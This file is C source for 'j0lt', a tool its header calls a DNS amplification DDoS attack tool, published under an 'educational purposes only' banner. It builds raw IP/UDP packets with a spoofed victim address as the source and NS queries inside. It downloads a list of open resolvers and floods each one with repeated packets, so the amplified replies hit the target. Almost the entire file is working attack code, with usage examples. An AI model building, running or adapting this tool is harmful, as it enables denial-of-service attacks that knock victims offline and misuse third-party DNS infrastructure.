/**
 *      _________  .__   __
 *     |__\   _  \ |  |_/  |_
 *     |  /  /_\  \|  |\   __\
 *     |  \  \_/   \  |_|  |              @7etsuo
 * /\__|  |\_____  /____/__|       https://github.com/7etsuo
 * \______|      \/              ddos amplification attack tool
 * ------------------------------------------------------------
 *          ** For educational purposes only **
 * ------------------------------------------------------------
 * Usage: sudo ./j0lt -t <target> -p <port> -n <nthreads>
 * (7etsuo)-$ gcc j0lt.c -o j0lt
 * (7etsuo)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -n 1337
 * ------------------------------------------------------------
 * Options:
 * [-x] will print a hexdump of the packet headers
 * [-d] puts j0lt into debug mode, no packets are sent
 * [-r list] will not fetch a resolv list, if one is provided.
 * ------------------------------------------------------------
 */

#include <ctype.h>         // Added for isdigit
#include <assert.h>        // Added for assert
#include <netdb.h>         // Added for getprotobyname
#include <arpa/nameser.h>  // Added for ns_t_ns, ns_c_in, ns_o_query, ns_r_noerror
#include <arpa/inet.h>     // Added for inet_addr
#include <netinet/in.h>    // Added for IPPROTO_RAW
#include <netinet/ip.h>    // Added for struct iphdr
#include <netinet/udp.h>  // Added for struct udphdr
#include <stdbool.h>      // Added for bool
#include <stdio.h>        // Added for printf, perror
#include <stdlib.h>       // Added for exit, malloc, free
#include <string.h>       // Added for memset, strlen, strtok_r
#include <sys/socket.h>   // Added for socket, AF_INET, SOCK_RAW
#include <unistd.h>       // Added for close

#include "io.h"      // Added for read_file_into_mem, readline, print_hex
#include "result.h"  // Added for Result_T
#include "process_control.h"  // Added for init_spawnattr, spawn_process, destroy_spawnattr
#include "opts.h"             // Added for JoltOptions, init_opts, parse_opts
#include "my_types.h"       // Added for GLOBAL_STRING_TYPE
#include "my_resolvlist.h"  // Added for wget_resolvlist_and_save_path

#include <stdint.h>  // Added for uint32_t, uint16_t, uint8_t
#include <stddef.h>  // Added for size_t

typedef struct __attribute__((packed, aligned(1))) {
  uint32_t sourceaddr;
  uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN
  uint32_t zero : 8;
  uint32_t protocol : 8;
  uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
  uint32_t udplen : 16;
  uint32_t protocol : 8;
  uint32_t zero : 8;
#endif
} PSEUDOHDR;

#define CHECK_SUCCESS(X, MSG)             \
  do {                                    \
    Result_T r = X;                       \
    if (r != RESULT_SUCCESS) {            \
      printf("%s [error: %i]\n", MSG, r); \
      exit(1);                            \
    }                                     \
  } while (false)

#define err_exit(msg)   \
  do {                  \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)

#define DEFINE_INSERT_FN(typename, datatype)                               \
  bool insert_##typename(uint8_t * *buf, size_t * buflen, datatype data) { \
    uint64_t msb_mask, lsb_mask, bigendian_data, lsb, msb;                 \
    size_t byte_pos, nbits;                                                \
                                                                           \
    if (*buflen < 1) {                                                     \
      return false;                                                        \
    }                                                                      \
                                                                           \
    nbits = sizeof(data) << 3;                                             \
    bigendian_data = 0ULL;                                                 \
    byte_pos = (nbits / 8) - 1;                                            \
    lsb_mask = 0xffULL;                                                    \
    msb_mask = (lsb_mask << nbits) - 8;                                    \
                                                                           \
    byte_pos = byte_pos << 3;                                              \
    for (int i = nbits >> 4; i != 0; i--) {                                \
      lsb = (data & lsb_mask);                                             \
      msb = (data & msb_mask);                                             \
      lsb <<= byte_pos;                                                    \
      msb >>= byte_pos;                                                    \
      bigendian_data |= lsb | msb;                                         \
      msb_mask >>= 8;                                                      \
      lsb_mask <<= 8;                                                      \
      byte_pos -= (2 << 3);                                                \
    }                                                                      \
                                                                           \
    data = bigendian_data == 0 ? data : bigendian_data;                    \
    for (size_t i = sizeof(data); *buflen > 0 && i > 0; i--) {             \
      *(*buf)++ = (data & 0xff);                                           \
      data = (data >> 8);                                                  \
      (*buflen)--;                                                         \
    }                                                                      \
                                                                           \
    return data == 0;                                                      \
  }
DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

// IP HEADER VALUES
#define IP_IHL_MIN_J0LT 5
#define IP_IHL_MAX_J0LT 15
#define IP_TTL_J0LT 0x40
#define IP_ID_J0LT 0xc4f3
// FLAGS
#define IP_RF_J0LT 0x8000  // reserved fragment flag
#define IP_DF_J0LT 0x4000  // dont fragment flag
#define IP_MF_J0LT 0x2000  // more fragments flag
#define IP_OF_J0LT 0x0000
// END FLAGS
#define IP_VER_J0LT 4
// END IPHEADER VALUES

// DNS HEADER VALUES
#define DNS_ID_J0LT 0xb4b3
#define DNS_QR_J0LT 0  // query (0), response (1).
// OPCODE
#define DNS_OPCODE_J0LT ns_o_query
// END OPCODE
#define DNS_AA_J0LT 0  // Authoritative Answer
#define DNS_TC_J0LT 0  // TrunCation
#define DNS_RD_J0LT 1  // Recursion Desired
#define DNS_RA_J0LT 0  // Recursion Available
#define DNS_Z_J0LT 0   // Reserved
#define DNS_AD_J0LT 0  // dns sec
#define DNS_CD_J0LT 0  // dns sec
// RCODE
#define DNS_RCODE_J0LT ns_r_noerror
// END RCODE
#define DNS_QDCOUNT_J0LT 0x0001  // num questions
#define DNS_ANCOUNT_J0LT 0x0000  // num answer RRs
#define DNS_NSCOUNT_J0LT 0x0000  // num authority RRs
#define DNS_ARCOUNT_J0LT 0x0000  // num additional RRs
// END HEADER VALUES
#define PEWPEW_J0LT 100  // value for the tmc effect.
#define MAX_LINE_SZ_J0LT 0x30

GLOBAL_STRING_TYPE GLOBAL_STRING_RESOLV_LIST_SAVE_NAME = "logs/j0lt-resolv.txt";
GLOBAL_STRING_TYPE GLOBAL_STRING_MENU = {
    " =========================================================\n"
    " Usage: sudo ./j0lt -t -p -n [OPTION]...                  \n"
    " -t <target>                      : target IPv4 (spoof)   \n"
    " -p <port>                        : target port           \n"
    " -n <nthreads>                    : nthreads of attack    \n"
    " -x [hexdump]                     : print hexdump         \n"
    " -d [debug]                       : offline debug mode    \n"
    " =========================================================\n"
    "           7etsuo: https://github.com/7etsuo           \n"};

size_t forge_j0lt_packet(char *payload, uint32_t resolvip, uint32_t spoofip,
                         uint16_t spoofport);
uint16_t j0lt_checksum(const uint16_t *addr, size_t count);

bool insert_dns_header(uint8_t **buf, size_t *buflen);
bool insert_dns_question(void **buf, size_t *buflen, const char *domain,
                         uint16_t query_type, uint16_t query_class);
bool insert_udp_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *phdr,
                       const uint8_t *data, size_t ulen, uint16_t sport);
bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
                      uint32_t daddr, uint32_t saddr, size_t ulen);
bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                  size_t nwritten);

int main(int argc, char **argv) {
  int i, nread;
  size_t szpayload, szpewpew;

  printf("%s", GLOBAL_STRING_MENU);

  JoltOptions opts;

  init_opts(&opts);

  CHECK_SUCCESS(parse_opts(&opts, argc, (const char **)argv),
                "* parse_opts error");
  char *savepath = NULL;
  CHECK_SUCCESS(wget_resolvlist_and_save_path(
                    GLOBAL_STRING_RESOLV_LIST_SAVE_NAME, &savepath),
                "* wget error");

  printf("+ resolv list saved to %s\n", savepath);

  void *resolvlist = NULL;
  size_t szresolvlist = 0;
  if (read_file_into_mem(savepath, &resolvlist, &szresolvlist) == false) {
    err_exit("* file read error");
    free(savepath);
  }
  free(savepath);

  char payload[NS_PACKETSZ], lineptr[MAX_LINE_SZ_J0LT];
  while (opts.nthreads >= 1) {
    nread = 0;
    char *resolvptr = (char *)resolvlist;
    if (opts.debug_mode == true)
      printf("+ current attack nthreads %d \n", opts.nthreads);
    while ((nread = readline(lineptr, resolvptr, MAX_LINE_SZ_J0LT,
                             szresolvlist)) != 0) {
      resolvptr += nread;
      szresolvlist -= nread;
      for (i = 0; isdigit(lineptr[i]); i++);
      if (lineptr[i] != '.')  // check ip4
        continue;

      in_addr_t resolvip = inet_addr(lineptr);
      if (resolvip == 0) continue;
      szpayload = forge_j0lt_packet(payload, htonl(resolvip),
                                    htonl(opts.spoof_ip), opts.spoof_port);
      if (opts.debug_mode == 0) {
        szpewpew = PEWPEW_J0LT;
        while (szpewpew-- > 0)
          send_payload((uint8_t *)payload, resolvip, htons(NS_DEFAULTPORT),
                       szpayload);
      }
      if (opts.hex_mode == 1) print_hex(payload, szpayload);
    }
    opts.nthreads--;
  }

  free(resolvlist);
  return 0;
}

size_t forge_j0lt_packet(char *payload, uint32_t resolvip, uint32_t spoofip,
                         uint16_t spoofport) {
  const char *url = ".";
  uint8_t pktbuf[NS_PACKETSZ], datagram[NS_PACKETSZ];
  uint8_t *curpos;
  size_t buflen, nwritten, szdatagram, udpsz;
  bool status;

  PSEUDOHDR pseudoheader;

  buflen = NS_PACKETSZ;
  memset(pktbuf, 0, NS_PACKETSZ);

  curpos = pktbuf;
  status = true;
  status &= insert_dns_header(&curpos, &buflen);
  status &=
      insert_dns_question((void **)&curpos, &buflen, url, ns_t_ns, ns_c_in);

  if (status == false) return 0;

  memset(datagram, 0, NS_PACKETSZ);
  curpos = datagram;
  udpsz = NS_PACKETSZ - buflen + sizeof(struct udphdr);
  status &= insert_ip_header(&curpos, &buflen, &pseudoheader, resolvip, spoofip,
                             udpsz);
  status &= insert_udp_header(&curpos, &buflen, &pseudoheader, pktbuf, udpsz,
                              spoofport);
  if (status == false) return 0;

  szdatagram = buflen;
  insert_data((void **)&curpos, &szdatagram, pktbuf, udpsz);
  nwritten = NS_PACKETSZ - buflen;

  memcpy(payload, datagram, nwritten);

  return nwritten;
}

bool insert_dns_header(uint8_t **buf, size_t *buflen) {
  bool status;
  uint8_t third_byte, fourth_byte;

  third_byte = (DNS_RD_J0LT | DNS_TC_J0LT << 1 | DNS_AA_J0LT << 2 |
                DNS_OPCODE_J0LT << 3 | DNS_QR_J0LT << 7);

  fourth_byte = (DNS_RCODE_J0LT | DNS_CD_J0LT << 4 | DNS_AD_J0LT << 5 |
                 DNS_Z_J0LT << 6 | DNS_RA_J0LT << 7);

  status = true;
  status &= insert_word(buf, buflen, DNS_ID_J0LT);

  status &= insert_byte(buf, buflen, third_byte);
  status &= insert_byte(buf, buflen, fourth_byte);

  status &= insert_word(buf, buflen, DNS_QDCOUNT_J0LT);
  status &= insert_word(buf, buflen, DNS_ANCOUNT_J0LT);
  status &= insert_word(buf, buflen, DNS_NSCOUNT_J0LT);
  status &= insert_word(buf, buflen, DNS_ARCOUNT_J0LT);

  return status;
}

bool insert_dns_question(void **buf, size_t *buflen, const char *domain,
                         uint16_t query_type, uint16_t query_class) {
  const char *token;
  char *saveptr, qname[NS_PACKETSZ];
  size_t srclen, domainlen, dif;
  bool status;

  dif = *buflen;
  domainlen = strlen(domain) + 1;
  if (domainlen > NS_PACKETSZ - 1) return false;

  memcpy(qname, domain, domainlen);
  if (qname[0] != '.') {
    token = strtok_r(qname, ".", &saveptr);
    if (token == NULL) return false;
    while (token != NULL) {
      srclen = strlen(token);
      insert_byte((uint8_t **)buf, buflen, srclen);
      insert_data(buf, buflen, token, srclen);
      token = strtok_r(NULL, ".", &saveptr);
    }
  }

  status = true;
  status &= insert_byte((uint8_t **)buf, buflen, 0x00);
  status &= insert_word((uint8_t **)buf, buflen, query_type);
  status &= insert_word((uint8_t **)buf, buflen, query_class);

  dif -= *buflen;
  if (dif % 2 != 0)  // pad
    status &= insert_byte((uint8_t **)buf, buflen, 0x00);

  return status;
}

bool insert_udp_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *phdr,
                       const uint8_t *data, size_t ulen, uint16_t sport) {
  bool status;
  size_t totalsz = sizeof(PSEUDOHDR) + ulen;
  size_t datasz = (ulen - sizeof(struct udphdr));
  size_t udpsofar;
  uint16_t checksum;
  uint8_t pseudo[totalsz];
  uint8_t *pseudoptr = pseudo;

  status = true;
  status &= insert_word(buf, buflen, sport);
  status &= insert_word(buf, buflen, NS_DEFAULTPORT);
  status &= insert_word(buf, buflen, (uint16_t)ulen);
  udpsofar = sizeof(struct udphdr) - 2;

  memset(pseudo, 0, totalsz);
  insert_dword(&pseudoptr, &totalsz, phdr->sourceaddr);
  insert_dword(&pseudoptr, &totalsz, phdr->destaddr);
  insert_byte(&pseudoptr, &totalsz, phdr->zero);
  insert_byte(&pseudoptr, &totalsz, phdr->protocol);
  insert_word(&pseudoptr, &totalsz, sizeof(struct udphdr));

  *buf -= udpsofar;
  insert_data((void **)&pseudoptr, (void *)&totalsz, *buf, udpsofar + 2);
  *buf += udpsofar;
  insert_data((void **)&pseudoptr, (void *)&totalsz, data, datasz);
  checksum = j0lt_checksum((uint16_t *)pseudo, sizeof(PSEUDOHDR) + ulen);
  checksum -= datasz;  // wtf...
  status &= insert_word(buf, buflen, checksum);

  return status;
}

bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
                      uint32_t daddr, uint32_t saddr, size_t ulen) {
  bool status;
  uint8_t *bufptr = *buf;
  uint8_t first_byte;
  uint16_t checksum;

  status = true;
  first_byte = IP_VER_J0LT << 4 | IP_IHL_MIN_J0LT;
  status &= insert_byte(buf, buflen, first_byte);
  status &= insert_byte(buf, buflen, 0x00);  // TOS
  status &=
      insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen);  // total len
  status &= insert_word(buf, buflen, IP_ID_J0LT);
  status &= insert_word(buf, buflen, IP_OF_J0LT);
  status &= insert_byte(buf, buflen, IP_TTL_J0LT);
  status &= insert_byte(buf, buflen, getprotobyname("udp")->p_proto);
  status &= insert_word(buf, buflen, 0x0000);
  status &= insert_dword(buf, buflen, saddr);
  status &= insert_dword(buf, buflen, daddr);

  checksum =
      j0lt_checksum((const uint16_t *)bufptr, (size_t)(IP_IHL_MIN_J0LT << 2));
  *buf -= 0xa;
  *(*buf)++ = (checksum & 0xff00) >> 8;
  **buf = checksum & 0xff;
  *buf += 9;

  memset(pheader, 0, sizeof(PSEUDOHDR));
  pheader->protocol = getprotobyname("udp")->p_proto;
  pheader->destaddr = daddr;
  pheader->sourceaddr = saddr;

  return status;
}

bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                  size_t nwritten) {
  int raw_sockfd;
  ssize_t nread;
  struct sockaddr_in addr;

  raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (raw_sockfd == -1) err_exit("* fatal socket error run using sudo");

  addr.sin_family = AF_INET;
  addr.sin_port = uh_dport;
  addr.sin_addr.s_addr = daddr;

  nread = sendto(raw_sockfd, datagram, nwritten, 0,
                 (const struct sockaddr *)&addr, sizeof(addr));

  close(raw_sockfd);
  return !(nread == -1 || (size_t)nread != nwritten);
}

uint16_t j0lt_checksum(const uint16_t *addr, size_t count) {
  register uint64_t sum = 0;

  while (count > 1) {
    sum += *(uint16_t *)addr++;
    count -= 2;
  }

  if (count > 0) sum += *(uint8_t *)addr;

  while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);

  return ~((uint16_t)((sum << 8) | (sum >> 8)));
}
